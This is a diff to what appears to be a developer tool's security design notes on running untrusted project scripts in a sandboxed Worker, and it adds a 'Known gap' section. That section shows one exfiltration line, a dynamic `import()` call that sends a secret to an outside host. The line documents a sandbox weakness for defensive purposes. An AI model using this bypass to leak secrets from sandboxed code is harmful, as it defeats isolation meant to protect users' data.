@@ -64,8 +64,14 @@ command — `devserver_start` takes a script *name* that must already exist in
 the target's `package.json`.
 
 Project scripts run in a sandboxed Worker with `fetch`, `XMLHttpRequest`,
-`WebSocket` and friends removed from the worker's global scope, so a script
-from an untrusted project cannot reach the RPC surface. Scripts see plain
+`WebSocket`, `postMessage` and friends deleted along the whole prototype
+chain, so a script from an untrusted project cannot reach the RPC surface.
+
+**Known gap:** dynamic `import()` is syntax rather than a property, so it
+cannot be removed this way — `import("http://host/?" + secret)` remains a GET
+exfiltration path. Closing it needs a CSP (`connect-src 'none'`) on the
+sandbox realm, which a plain Worker cannot carry; it requires hosting the
+sandbox in a sandboxed iframe. Scripts see plain
 vectors and return a transform patch; they never touch three.js objects
 directly. A step that runs longer than 2s terminates the worker.
 
